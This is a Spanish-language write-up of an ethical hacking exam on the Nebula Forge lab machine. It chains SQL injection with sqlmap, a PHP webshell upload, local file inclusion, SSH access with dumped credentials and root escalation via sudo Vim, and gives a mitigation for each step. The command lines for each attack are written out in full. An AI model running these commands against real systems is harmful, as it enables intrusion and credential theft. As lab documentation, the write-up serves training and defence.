---
title: "Vuln-Lab (Nebula Forge) - SQLi, RCE, LFI y escalada por sudo Vim"
permalink: /writeups/vuln-lab-nebula/
excerpt: "Examen final de Hacking Ético sobre el laboratorio Nebula Forge: inyección SQL con sqlmap, File Upload/RCE, Local File Inclusion, acceso SSH y escalada a root abusando de sudo Vim. Cinco banderas capturadas."
date: 2025-06-27
categories:
  - Máquinas
tags:
  - linux
  - sqli
  - sqlmap
  - file-upload
  - rce
  - lfi
  - sudo
  - privesc
  - hacking
---

> **Máquina:** Vuln-Lab 2025 / Nebula Forge · **Plataforma:** Hacking (Academia de Ciberseguridad) · **SO:** Linux · **Examen final Hacking Ético 1 y 2**

## 1. Introducción y alcance

Ejercicio de intrusión controlada sobre el laboratorio **Nebula Forge**, objetivo `157.245.220.50`. El alcance contempla la identificación de vulnerabilidades en la aplicación web, la obtención de acceso al servidor y la escalada de privilegios hasta root, capturando las cinco banderas en formato `CTF{...}`.

## 2. Resumen ejecutivo

Se identificó una aplicación web expuesta públicamente en el puerto 8080, con tres módulos deliberadamente vulnerables: inicio de sesión con inyección SQL, carga de archivos con ejecución remota de comandos, e inclusión de archivos locales. La explotación encadenada de estos fallos, junto a credenciales reutilizadas y una configuración de `sudo` insegura, permitió el compromiso total del servidor.

Riesgos clave: vulnerabilidades críticas sin autenticación, ausencia de cifrado (HTTP), credenciales por defecto y delegación de `sudo` sobre un editor.

## 3. Reconocimiento

Se realizó reconocimiento pasivo y activo sobre `157.245.220.50:8080`, con enumeración de puertos y directorios (Nmap, gobuster, nikto, shodan.io) y análisis de vulnerabilidades (Nmap, sqlmap). El portal expone tres secciones vulnerables.

![Portal del laboratorio Nebula Forge](/assets/informes/vuln-lab-nebula/p04_02.jpg)

![Módulos vulnerables del portal](/assets/informes/vuln-lab-nebula/p05_03.jpg)

| Campo | Valor |
|---|---|
| IP | 157.245.220.50 |
| Servicios | 8080/HTTP (Apache+PHP) · 22 y 2222/SSH · MariaDB (local) |
| Vectores | SQLi · File Upload/RCE · LFI · sudo Vim |

## 4. Inyección SQL (SQLi Login)

Se interceptó la petición de login (`login.php`) con Burp Suite y se exportó a `req.txt` para procesarla con sqlmap.

Enumeración de bases de datos:

```bash
sqlmap -r req.txt --batch --level=5 --risk=3 --random-agent --dbs
```

![Captura de la petición con Burp Suite](/assets/informes/vuln-lab-nebula/p07_04.jpg)

![Enumeración de bases de datos con sqlmap](/assets/informes/vuln-lab-nebula/p07_05.jpg)

Se descubre la base de datos `vuln`. Se enumeran sus tablas y columnas:

```bash
sqlmap -r req.txt -D vuln --tables --batch
sqlmap -r req.txt -D vuln -T users --columns --batch
```

![Enumeración de tablas](/assets/informes/vuln-lab-nebula/p08_06.jpg)

![Enumeración de columnas de users](/assets/informes/vuln-lab-nebula/p08_07.jpg)

Se extraen las credenciales de la tabla `users` y la bandera de la tabla `flags`:

```bash
sqlmap -r req.txt -D vuln -T users -C username,password --dump --batch
sqlmap -r req.txt -D vuln -T flags --dump --batch
```

![Volcado de credenciales](/assets/informes/vuln-lab-nebula/p09_08.jpg)

![Volcado de la tabla flags](/assets/informes/vuln-lab-nebula/p09_09.jpg)

Se confirmaron vectores boolean-based, error-based, time-based y UNION-based. **Bandera:** `CTF{web_sqli_flag}`.

**Mitigación:** consultas preparadas (PDO/mysqli), validación y saneamiento de entradas, mínimo privilegio en la cuenta de BD, auditoría de errores SQL y un WAF.

## 5. File Upload / Remote Code Execution (RCE)

El módulo de carga de archivos no valida el tipo ni la extensión, permitiendo subir un webshell PHP y ejecutar comandos en el servidor.

![Subida del webshell y ejecución de comandos](/assets/informes/vuln-lab-nebula/p11_10.jpg)

Se leen archivos sensibles como `/etc/passwd` y se buscan banderas en el sistema:

```
http://157.245.220.50:8080/uploads/shell.php?cmd=find / -type f -name "*flag*" 2>/dev/null
```

![Lectura de /etc/passwd vía webshell](/assets/informes/vuln-lab-nebula/p12_11.jpg)

![Búsqueda de banderas en el sistema](/assets/informes/vuln-lab-nebula/p12_13.jpg)

![Lectura de la bandera Upload/RCE](/assets/informes/vuln-lab-nebula/p13_16.jpg)

**Bandera:** `CTF{file_upload_flag}`.

**Mitigación:** validar MIME/extensión/contenido, renombrar los archivos subidos, almacenarlos fuera del directorio ejecutable, bloquear la ejecución de scripts en la carpeta de subidas y escanear con antimalware.

## 6. Local File Inclusion (LFI)

Se manipuló el parámetro `file` de `download.php` para leer archivos arbitrarios del sistema, incluida la tercera bandera:

```
http://157.245.220.50:8080/download.php?file=flag3.txt
```

![Lectura de archivos por LFI](/assets/informes/vuln-lab-nebula/p14_21.jpg)

![Bandera LFI](/assets/informes/vuln-lab-nebula/p16_24.jpg)

**Bandera:** `CTF{lfi_flag}`.

**Mitigación:** evitar rutas suministradas por el usuario, usar listas blancas, validar con `basename()`/`realpath()`, deshabilitar `allow_url_include` y aplicar control de acceso a los archivos internos.

## 7. Acceso por SSH

Con las credenciales extraídas por SQLi y tras verificar con shodan.io que el puerto 2222 estaba expuesto (el 22 no permitía acceso), se estableció sesión SSH como el usuario **Carlos**.

![Acceso SSH por el puerto 2222](/assets/informes/vuln-lab-nebula/p18_27.jpg)

![Bandera del usuario Carlos](/assets/informes/vuln-lab-nebula/p19_28.jpg)

**Bandera:** `CTF{ssh_flag}`.

## 8. Escalada de privilegios

El usuario Carlos no tiene privilegios administrativos. Con `sudo -l` se comprueba que puede ejecutar el binario **Vim** como root sin contraseña, lo que permite abrir una shell privilegiada:

```bash
sudo -l
sudo /usr/bin/vim -c ':!bash'
```

![Comprobación de permisos sudo](/assets/informes/vuln-lab-nebula/p19_30.jpg)

![Escalada a root mediante sudo Vim](/assets/informes/vuln-lab-nebula/p20_31.jpg)

Con acceso como root se extraen las dos banderas finales.

![Banderas de root](/assets/informes/vuln-lab-nebula/p20_32.jpg)

**Banderas:** `CTF{root_pwned_flag}` y `CTF{vim_escape_flag}`.

## 9. Banderas capturadas

| # | Nivel | Bandera |
|---|---|---|
| 1 | Web (SQLi) | CTF{web_sqli_flag} |
| 2 | Web (File Upload/RCE) | CTF{file_upload_flag} |
| 3 | Web (LFI) | CTF{lfi_flag} |
| 4 | Cuenta de servicio (SSH) | CTF{ssh_flag} |
| 5 | Root (sudo Vim) | CTF{root_pwned_flag} · CTF{vim_escape_flag} |

## 10. Herramientas utilizadas

Kali Linux, Nmap, gobuster, nikto, shodan.io, Burp Suite y sqlmap.

## 11. Conclusiones y remediación

El compromiso total fue posible por una cadena de fallos: entradas no parametrizadas (SQLi), carga de archivos sin restricción (RCE), inclusión de archivos sin saneamiento (LFI), credenciales reutilizadas y una delegación de `sudo` sobre un editor. Como acciones prioritarias: parametrizar todas las consultas, restringir y validar las cargas, sanear los parámetros de inclusión, rotar las credenciales por defecto y, de forma crítica, retirar Vim (y cualquier editor o intérprete) de las reglas de `sudo`, reforzando con NOEXEC, auditoría y políticas AppArmor/SELinux.
